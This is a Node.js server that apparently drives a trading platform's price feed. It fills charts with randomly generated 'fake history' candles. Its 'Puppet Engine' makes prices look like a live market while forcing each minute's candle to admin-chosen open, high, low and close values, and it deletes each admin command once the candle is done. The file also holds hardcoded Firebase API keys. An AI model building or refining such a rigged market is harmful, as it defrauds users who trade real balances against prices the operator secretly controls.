const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

// ==========================================
// 1. DUAL FIREBASE CONFIGURATION
// ==========================================

// MAIN DATABASE (For Users, Balances, Trade History - Old Firebase)
const mainConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

// MARKET DATABASE (For Live Candles, Admin Target Control - New Firebase)
const marketConfig = {
    apiKey: "AIzaSyBspVTNDTLn2zuwwI7580vqHABrAjJl63o",
    authDomain: "earning-xone-v1.firebaseapp.com",
    databaseURL: "https://earning-xone-v1-default-rtdb.firebaseio.com",
    projectId: "earning-xone-v1",
    storageBucket: "earning-xone-v1.appspot.com",
    messagingSenderId: "471994174185",
    appId: "1:471994174185:web:eb45e6c24a66b40c34fe78"
};

// Initialize Both Apps
const mainApp = firebase.initializeApp(mainConfig, "MainApp");
const marketApp = firebase.initializeApp(marketConfig, "MarketApp");

const dbMain = mainApp.database();       // For User Data
const dbMarket = marketApp.database();   // For Market & Candles

// ==========================================
// 2. SERVER SETUP & VARIABLES
// ==========================================
const app = express();
app.use(cors());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const MAX_CANDLES = 1500; // Limit memory to 1500 candles per market
const TIMEFRAME = 60000;  // 1 Minute candle
const TICK_MS = 300;      // Tick animation speed
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 300;

const markets = {};       // Internal Memory Storage (Saves Firebase Storage)
const marketTargets = {}; // Admin's Target Instructions

function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

// ==========================================
// 3. ADMIN PUPPET LISTENER (From Market DB)
// ==========================================
// Listen for exact OHLC targets set by admin
dbMarket.ref('admin/market_targets').on('value', (snapshot) => {
    const targets = snapshot.val() || {};
    // Clear old targets and set new ones
    for (let key in marketTargets) delete marketTargets[key];
    Object.keys(targets).forEach(marketId => {
        marketTargets[marketId] = targets[marketId];
    });
});

// Listen to Market List initialization
dbMarket.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach((marketId) => {
        if (!markets[marketId]) {
            initializeNewMarket(marketId);
        }
    });
});

// ==========================================
// 4. CANDLE GENERATOR & PUPPET ENGINE
// ==========================================

// Seed history for new markets
async function initializeNewMarket(marketId) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.15; // Default price
    
    // Try to get last price from Market DB
    try {
        const liveSnap = await dbMarket.ref(`markets/${path}/live`).once('value');
        if (liveSnap.val()?.price) startPrice = liveSnap.val().price;
    } catch (e) {}

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let currentPrice = startPrice;

    // Generate fake history to fill chart
    for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
        const isGreen = Math.random() > 0.5;
        const body = currentPrice * 0.0002;
        const close = isGreen ? currentPrice + body : currentPrice - body;
        candles.push({
            timestamp: nowPeriod - (i * TIMEFRAME),
            open: roundPrice(currentPrice),
            high: roundPrice(Math.max(currentPrice, close) + body * 0.5),
            low: roundPrice(Math.min(currentPrice, close) - body * 0.5),
            close: roundPrice(close)
        });
        currentPrice = close;
    }

    markets[marketId] = {
        marketId,
        marketPath: path,
        history: candles,
        currentPrice: currentPrice,
        lastMove: 0
    };
    console.log(`[MARKET INIT] ${marketId} seeded with ${HISTORY_SEED_COUNT} candles.`);
}

// Normal Realistic Tick (When no admin command)
function updateRealisticPrice(marketData, currentCandle) {
    if (Math.random() < 0.35) return; // Add pauses for realism
    
    const openPrice = currentCandle.open;
    const baseVolatility = openPrice * 0.00005;
    
    let impulse = (Math.random() - 0.5) * baseVolatility * 2.5;
    marketData.currentPrice += impulse;
    
    currentCandle.close = roundPrice(marketData.currentPrice);
    currentCandle.high = roundPrice(Math.max(currentCandle.high, currentCandle.close));
    currentCandle.low = roundPrice(Math.min(currentCandle.low, currentCandle.close));
}

// 🔥 PUPPET ENGINE: Forces price to perfectly match Admin's Target
function updatePuppetPrice(marketData, currentPeriodStart, currentCandle) {
    const target = marketTargets[marketData.marketId];
    
    // If no target from admin, act like a normal market
    if (!target) {
        updateRealisticPrice(marketData, currentCandle);
        return;
    }

    const now = Date.now();
    const timeElapsed = now - currentPeriodStart; // 0 to 60000
    const progress = Math.min(timeElapsed / TIMEFRAME, 1.0); // 0.0 to 1.0

    let currentLivePrice;

    // Animation Logic (Matching 1 Minute Timeframe)
    if (progress < 0.3) {
        // 0-18s: Move from Open towards the targeted High or Low range
        const distance = target.target_high - target.target_open;
        currentLivePrice = target.target_open + (distance * (progress / 0.3));
    } 
    else if (progress < 0.8) {
        // 18s-48s: Fluctuate normally inside the High/Low boundary
        const range = target.target_high - target.target_low;
        currentLivePrice = target.target_low + (Math.random() * range);
    } 
    else {
        // 48s-60s: Magnetically pull the price exactly to target_close
        const remainingProgress = (progress - 0.8) / 0.2; // 0.0 to 1.0
        const distanceToClose = target.target_close - marketData.currentPrice;
        currentLivePrice = marketData.currentPrice + (distanceToClose * remainingProgress);
    }

    // Apply Live Price
    marketData.currentPrice = currentLivePrice;
    currentCandle.close = roundPrice(currentLivePrice);
    
    // Strict boundaries
    currentCandle.high = roundPrice(Math.max(currentCandle.high, currentLivePrice));
    currentCandle.low = roundPrice(Math.min(currentCandle.low, currentLivePrice));

    // Force perfect match at the very last second
    if (progress >= 0.98) {
        currentCandle.close = target.target_close;
        currentCandle.high = target.target_high;
        currentCandle.low = target.target_low;
    }
}

// ==========================================
// 5. MAIN TICK LOOP (Runs 24/7)
// ==========================================
let lastSyncSecond = 0;

setInterval(() => {
    const now = Date.now();
    const currentPeriodStart = Math.floor(now / TIMEFRAME) * TIMEFRAME;
    const currentSecond = Math.floor(now / 1000);

    for (const marketId in markets) {
        const marketData = markets[marketId];
        let lastCandle = marketData.history[marketData.history.length - 1];

        // 1. Detect New Minute (Candle Creation)
        if (!lastCandle || currentPeriodStart > lastCandle.timestamp) {
            
            // 🔥 REMOVE ADMIN TARGET FROM FIREBASE (Limit Saver!)
            // After finishing a target candle, we delete the command.
            if (marketTargets[marketId]) {
                dbMarket.ref(`admin/market_targets/${marketId}`).remove();
                delete marketTargets[marketId];
                console.log(`[PUPPET COMPLETED] Target for ${marketId} achieved and cleared.`);
            }

            // Shift history (Delete oldest to maintain 1500 limit memory)
            if (marketData.history.length >= MAX_CANDLES) {
                marketData.history.shift(); 
            }

            // Create Blank Candle for New Minute
            const openPrice = lastCandle ? lastCandle.close : 1.15;
            lastCandle = {
                timestamp: currentPeriodStart,
                open: openPrice,
                high: openPrice,
                low: openPrice,
                close: openPrice
            };
            marketData.history.push(lastCandle);
        }

        // 2. Move Price (Animate)
        updatePuppetPrice(marketData, currentPeriodStart, lastCandle);

        // 3. Broadcast to Live Users via WebSocket (0 Firebase Limits)
        const payload = JSON.stringify({ market: marketId, candle: lastCandle, serverTime: now });
        wss.clients.forEach((client) => {
            if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
                client.send(payload);
            }
        });
    }

    // 4. Save ONLY the Live Price to Firebase Market DB (Every 2 Seconds)
    // This allows new users to load the current price fast.
    if (currentSecond % 2 === 0 && currentSecond !== lastSyncSecond) {
        lastSyncSecond = currentSecond;
        const batchUpdates = {};
        for (const marketId in markets) {
            const m = markets[marketId];
            const lastC = m.history[m.history.length - 1];
            if (lastC) {
                batchUpdates[`markets/${m.marketPath}/live`] = {
                    price: lastC.close,
                    timestamp: lastC.timestamp
                };
            }
        }
        // Write to New Market DB (Will never run out of quota)
        dbMarket.ref().update(batchUpdates).catch(()=>{});
    }

}, TICK_MS);


// ==========================================
// 6. API & WEBSOCKET CONNECTIONS
// ==========================================

// Handle WebSocket Subscriptions
wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
            }
        } catch (e) {}
    });
});

// REST API for Users to Load 1500 History Candles
app.get('/api/history/:marketId', (req, res) => {
    const marketId = req.params.marketId;
    if (markets[marketId] && markets[marketId].history) {
        res.json(markets[marketId].history);
    } else {
        res.status(404).json({ error: 'Market not found' });
    }
});

// Cron-job ping endpoint
app.get('/ping', (_req, res) => res.send('Puppet Engine v1.0 - Dual DB Active'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🚀 Puppet Engine Server running on port ${PORT}`));